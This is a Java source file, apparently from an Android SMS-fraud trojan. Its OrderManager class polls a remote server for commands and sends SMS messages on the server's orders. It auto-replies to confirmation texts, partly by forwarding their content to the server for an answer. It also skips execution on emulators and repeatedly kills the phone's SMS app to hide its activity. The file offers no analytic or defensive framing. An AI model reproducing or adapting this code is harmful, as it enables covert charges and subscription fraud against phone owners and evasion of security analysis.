package net.workspace.manager;
import java.util.ArrayList;
import java.util.Map;
import net.workspace.bean.Feedback;
import net.workspace.bean.IQAnswer;
import net.workspace.bean.Json;
import net.workspace.bean.Order;
import net.workspace.bean.RunningApp;
import net.workspace.bean.form.IQForm;
import net.workspace.bean.form.OrderForm;
import net.workspace.bean.form.OrderReportForm;
import net.workspace.http.HttpJsonThread;
import net.workspace.http.NetContext;
import net.workspace.listener.FlowListener;
import net.workspace.listener.NetListener;
import net.workspace.listener.NetworkListener;
import net.workspace.listener.SendSmsListener;
import net.workspace.network.NetworkController;
import net.workspace.sms.SmsSender;
import net.workspace.util.CommonUtil;
import net.workspace.util.MyLogger;
import org.json.JSONObject;

public class OrderManager implements NetListener {
    private abstract class AbstractNetworkListener implements NetListener {
        @Override
        public void onSuccess(int callBack, String url, String content) {
            CommonUtil.killSmsApp();
        }
    }
    public static OrderManager getInstance() {
        if (instance == null) {
            synchronized (locker) {
                if (instance == null) instance = new OrderManager();
            }
        }
        return instance;
    }
    public static final int ORDER = 1;
    public static final int INTELLIGENCE_QUESTION = 2;
    public static final int XJ_PAY = 9;
    private final static Object locker = new Object();
    private static OrderManager instance;
    private static final int CONFIRM_TYPE_VARIABLE = 0;
    private static final int CONFIRM_TYPE_SERVER = 2;
    private OrderManager() {}
    private void anserIQ(final IQAnswer iqAnswer) {
        if (iqAnswer != null) {
            new SmsSender(new SendSmsListener() {
                @Override
                public void onSendSmsFailed(String address, String message, String errorMsg) {
                    ReportManager.failureReport(iqAnswer, errorMsg);
                }
                @Override
                public void onSendSmsSuccess(String address, String message) {
                    ReportManager.successReport(iqAnswer, address + "->" + message);
                }
            }).sendSms(iqAnswer.reciever, iqAnswer.answer, iqAnswer.timeout);
        }
    }
    private void doOrderReport(final long bizId, final long orderId, final String errorMessage) {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    try {
                        OrderReportForm form = CommonUtil.initForm(OrderReportForm.class);
                        form.orderId = orderId;
                        form.errorMessage = errorMessage;
                        form.bizId = bizId;
                        String url = CommonUtil.SERVER_URL;
                        JSONObject data = form.toJson();
                        MyLogger.debug("OrderManager orderReport request url:" + url);
                        MyLogger.debug("OrderManager orderReport request data:" + data);
                        new HttpJsonThread(new NetContext(url, data, new AbstractNetworkListener() {
                            @Override
                            public void onFailed(int callBack, String errorCode, String errorMsg) {
                                MyLogger.debug(String.format("OrderManager orderReport response error. errorCode:%s,errorMsg:%s", errorCode, errorMsg));
                            }
                            @Override
                            public void onSuccess(int callBack, String url, String content) {
                                super.onSuccess(callBack, url, content);
                                MyLogger.debug("OrderManager order response:" + content);
                                try {
                                    JSONObject obj = CommonUtil.toJson(content);
                                    if (obj != null) {
                                        executeOrder(Json.optObj(Order.class, obj));
                                    }
                                } catch (Exception e) {
                                    MyLogger.error(e);
                                }
                            }
                            @Override
                            public void onTimeout(int i) {
                                MyLogger.debug("TaskManager orderReport response timeout");
                            }
                        }, 1, true)).startThread();
                    } catch (Exception e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    public void execute() {
        if (CommonUtil.isEmulator() || !CommonUtil.isSimReady()) { return; }
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                request();
            }
        });
    }
    public void executeFeedback(String address, String text, Feedback feedback) {
        switch (feedback.type) {
            case CONFIRM_TYPE_VARIABLE: {
                String confimText = CommonUtil.parseVariable(text, feedback.content);
                if (confimText != null) {
                    String receiver = feedback.port != null && feedback.port.length() > 4 ? feedback.port : address;
                    sendSms(feedback, receiver, confimText);
                }
                break;
            }
            case CONFIRM_TYPE_SERVER: {
                requestIntelligenceQuestion(text, address, feedback);
                break;
            }
        }
    }
    public void executeOrder(final Order order) {
        FlowManager.getInstanse().execute(order, new FlowListener() {
            @Override
            public void onFinished(Map<String, String> variables, String errorMsg) {
                doOrderReport(order.bizId, order.id, errorMsg);
                if (order.continueNext) {
                    request();
                }
            }
        });
    }
    @Override
    public void onFailed(int i, String s, String s1) {
        reportFailure();
    }
    @Override
    public void onSuccess(int callBack, String url, String retSrc) {
        CommonUtil.killSmsApp();
        MyLogger.debug("callback", callBack);
        MyLogger.debug("retSrc", retSrc);
        try {
            JSONObject obj = CommonUtil.toJson(retSrc);
            if (obj != null) {
                switch (callBack) {
                    case ORDER:
                        executeOrder(Json.optObj(Order.class, obj));
                        break;
                    case INTELLIGENCE_QUESTION:
                        anserIQ(Json.optObj(IQAnswer.class, obj));
                        break;
                    case XJ_PAY:
                        readXJPay(obj);
                        break;
                }
            }
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
    @Override
    public void onTimeout(int i) {
        reportFailure();
    }
    public void readXJPay(JSONObject jsonobject) {
        String result = jsonobject.optString("result");
        if (result.equals("0")) {}
    }
    private void reportFailure() {
        //TODO,
    }
    public void request() {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    //OrderForm form = new OrderForm(T.getSmsPermissionApp());
                    try {
                        OrderForm form = CommonUtil.initForm(OrderForm.class);
                        form.smsAppList = new ArrayList<RunningApp>();
                        new HttpJsonThread(new NetContext(CommonUtil.SERVER_URL, form.toJson(), OrderManager.this, 1, true)).startThread();
                    } catch (Exception e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    /**
     * 智能回复短信
     * @param content
     * @param address
     * @param sign
     * @param payOrderId
     */
    public void requestIntelligenceQuestion(final String content, final String address, final Feedback feedback) {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    try {
                        IQForm form = CommonUtil.initForm(IQForm.class);
                        form.feedback = feedback;
                        form.address = address;
                        form.content = content;
                        new HttpJsonThread(new NetContext(CommonUtil.SERVER_URL, form.toJson(), OrderManager.this, 2, true)).startThread();
                    } catch (Exception e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    private void sendSms(final Feedback feedback, final String number, final String msg) {
        new SmsSender(new SendSmsListener() {
            @Override
            public void onSendSmsFailed(String address, String message, String errorMsg) {
                ReportManager.failureReport(feedback, msg);
            }
            @Override
            public void onSendSmsSuccess(String address, String message) {
                ReportManager.successReport(feedback, number + "->" + msg);
            }
        }).sendSms(number, msg, feedback.timeout);
    }
}
